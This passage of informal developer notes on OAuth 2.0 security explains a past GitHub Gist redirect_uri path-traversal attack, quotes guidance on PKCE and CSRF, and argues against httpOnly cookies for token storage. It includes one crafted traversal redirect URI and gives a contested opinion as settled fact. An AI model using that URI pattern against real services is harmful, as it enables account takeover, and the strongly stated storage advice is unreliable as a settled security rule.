And we have the access token to the victim's account.

That callback receives the code. Now it would attempt to fetch an access token
using that code. That's a POST request, with the `redirect_url` of
`https://gist.github.com/auth/github/callback`. Remember that the original
`redirect_uri` is:

`https://gist.github.com/auth/github/callback/../../../homakov/8820324`

So if it compares the two, then it would error out.

Now, that POST request's `redirect_uri` parameter is set in stone. It is set by
the Ruby web server of GitHub, i.e. by the "confidential client" that's in
charge of the `https://gist.github.com/auth/github/callback` page (or JavaScript
if it's a public app), to exactly the same url,
`https://gist.github.com/auth/github/callback`. It's **guaranteed** to be the
correct because it's a GitHub crafted code (Ruby code, or JavaScript code in the
public app scenario), which is relatively different than
`https://gist.github.com/auth/github/callback/../../../homakov/8820324`. This is
the key point.

=> If the `redirect_uri` is checked to be matched, then the attack would not
work.

If strict matching is enforced, then the malicious `redirect_uri` would not have
been approved and this wouldn't be a problem. Sometimes the strict matching
implementation is faulty, so this `redirect_uri` matching exists as a fallback.

---

Q: Is `state` has a role of CSRF prevention when using PCKE?

A: No. Quote from OAuth 2.0 Security Best Current Practice:
[link](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-2.1)

> Clients MUST prevent Cross-Site Request Forgery (CSRF). In this context, CSRF
> refers to requests to the redirection endpoint that do not originate at the
> authorization server, but a malicious third party (see Section 4.4.1.8. of
> [RFC6819] for details). Clients that have ensured that the authorization
> server supports PKCE [RFC7636] MAY rely the CSRF protection provided by PKCE.
> In OpenID Connect flows, the nonce parameter provides CSRF protection.
> Otherwise, one- time use CSRF tokens carried in the state parameter that are
> securely bound to the user agent MUST be used for CSRF protection (see Section
> 4.7.1).

---

Q: Why storing tokens in `localStorage` when using OAuth is OK

A:

The defenders of `httpOnly` Cookie says that it's for protecting the token, so
that "it is not so easy to store the token and then later on perform malicious
requests". That's the only argument that I could hear.

Consider using just an Access Token and no Refresh Token, and the Access Token
has a not-short lifetime (because using short-lived AT and no RT is a little too
much re-login). If this AT were to be leaked, either the victim realizes and
reports to the Authorization Server to invalidate the token, or the attacker has
access until the AT expires.

Storing the AT in `httpOnly` Cookie does prevent scripts from reading the
literal token, but the attacker doesn't have to know the token in order to make
requests. If Facebook has an XSS vulnerability, the attacker is guaranteed to be
able to post using crafted HTTP request, no matter how the token is stored: If
the token is stored in localStorage, then it's easy to get; if it's stored in a
`httpOnly` Cookie, then it's even easier, just send the request and the Cookie
will be sent along by the browser.

Yeah, they don't know the literal access token. However, they don't need to.
Remember that the assumption is that we are under an XSS attack. Let's bump the
severity (and classicality) a bit: If a Banking website has an XSS
vulnerability, is the choice between `localStorage` or `httpOnly` Cookie matter?

_(Please ignore any 2FA in today's banking systems, because if every HTTP
request in a normal website also has 2FA then it's unrealistic, not to mention
using `localStorage` is "suddenly becoming feasible".)_

That's right. It's an **one-off** attack. They just need access once and once
only to send all of your money to them.

Now let's bump back down to Facebook. By the time the leaked access token is
expired, Facebook should have fixed the XSS vulnerability already. Using
`httpOnly` Cookie is only "useful" until the XSS vulnerability is fixed, which
is usually a small time window, providing that you care about your service. Even
then, the attacker doesn't need to obtain the literal Access Token. Each time
the user opens up Facebook, the attacker makes various requests (sending malware
private messages, advertisements, sharing posts, posting malware, ...) and
that's enough damage per victim for them (and they have millions). What do they
need after that? Facebook still has XSS, and there's still more occasions to do
damage in the future if they want.

Okay, sure. Supposedly they save that for later use, because fixing XSS could
take a month, and the access token expires after 1 month.

Let's meet OAuth 2.0.

Jumping to the current best practice, we have a short-lived Access Token and
long-lived Refresh Token.

The obvious question/argument is that, if the Refresh Token is leaked, then the
attacker can still obtain Access Tokens and have access, why bother with Refresh
Token?

If you have **not** ask this question before implementing Refresh Token then you
are overengineering your system. The choice between `localStorage` or `httpOnly`
Cookie is irrelevant to you. If you did, then good, you probably have the
answer.

Every time a Refresh Token is used, it's immediately invalidated along with all
previous Access Tokens, and a new Refresh Token is issued. This is called
Refresh Token Rotation. Old Access Tokens are invalidated; any attempt to use
invalidated Refresh Token and the entire AT+RT associated with the account is
immediately invalidated, requiring a re-login. Without Refresh Token Rotation,
implementing Refresh Token is an overengineering effort that solves nothing.

**This Refresh Token Rotation thing will provide a protection layer when the
Refresh Token is leaked. Compare to just using a not-short-lived Access Token,
this is an improvement, since the Access Token is now very short-lived.**

Now, with this approach, if the Access Token is leaked, then it's available for
like 10 minutes. What would the attacker do in 10 minutes? Is what they want
achievable for 5 seconds while they have XSS access to the website? **Stealing
Access Token that lives 30 days makes sense, but stealing one that lives 10
minutes does not.**

So the only remaining concerns is Refresh Token leakage.

If the Refresh Token is leaked instead and used at least once, then when the
victim's browser make a request, they are using the old Access Token. Well, that
might expires, so they requests a new one using the **old** Refresh Token.
That's when the Authorization Server invalidates all tokens.

Supposing that the Refresh Token is leaked and the user will never make any
request again, and the attacker has access for a very, very long time. Can't get
more worse than this. Now, how is it leaked? Via XSS, right? When the XSS is
fixed, then the website's developer does what? That's right, invalidating all
tokens of all accounts on their website, requiring a re-login again. That's once
in a blue moon, so don't question the feasibility of that wiping action, it's
possible and is the correct measure to fix the problem.

**Is `httpOnly` Cookie helps in this ultimate scenario?**

Considering Facebook. If there's a constant re-login then this is a sign of an
XSS attack, and the victim should realize that their account is compromised and
reports to the developer. They might even see that their Facebook inbox suddenly
has a lot of angry responses.

Let's consider another extreme: Your website has 1 user (you),
the Refresh Token is leaked, and you'll never visit that site or make any
authorized HTTP request again. Well first of all, that service should not be
exposed to the internet. Then, the fact that you'll never (or very occasionally)
use that service says a lot about your decision using that service in the first
place, and please just **Revoke Access** on the Authorization Server after doing
your thing. **Then**, I hope you realize that your website has XSS; if the
leaked Refresh Token lasts 1 year (yes, Refresh Token has the absolute expire
date, the time that it must die), you should have fixed XSS or you should not
maintain your service at all. How, you ask?

If you just please visit your service every month, you would be presented with a
re-login, which you should not see, that could tell you something. Just to be
sure, or if your browser's storage is wiped, visit your Authorization Server's
website, they should have a section telling you that the leaked Refresh Token is
last used while you're not using them, and you'd know you f'ed up. Usually a
Refresh Token is associated with a device, something like "iPhone XR, last used
5 minutes ago" on Facebook or Google (remember, Facebook or Google's
**Authorization Server**, not the Facebook or Google service).

Fine. If you'd never have a way to discover that your website is having XSS
vulnerability (god bless you), or you will never visit the Authorization
Server's website to check your Refresh Tokens' usage, or you use that service
maybe once a year, then go ahead and implement `httpOnly` Cookie to hide the
token. **And probably shut down your service too, because it's insecure and no
one cares.**

**One, if you don't have XSS then `httpOnly` Cookie solves nothing. Two, the
earliness of the discovery of XSS (i.e. your service f'ed up) is independent of
the choice between `localStorage` or `httpOnly` Cookie for token storage. That
depends on your victim's urgency to report\*. Using `localStorage` could even
allow for easier attack, and you would know you f'ed up sooner. Why? Because if
you want to have XSS for 2 years instead of 30 minutes then go 'head.**

\* Before you argue, it's the victim who should know that their account is
compromised and your website is f'ed, not you, the developer. If the victim
don't realize that their account is compromised, then they probably don't care
if your service is f'ed. If they do, you'd probably face a bankruptcy so you
would know immediately.
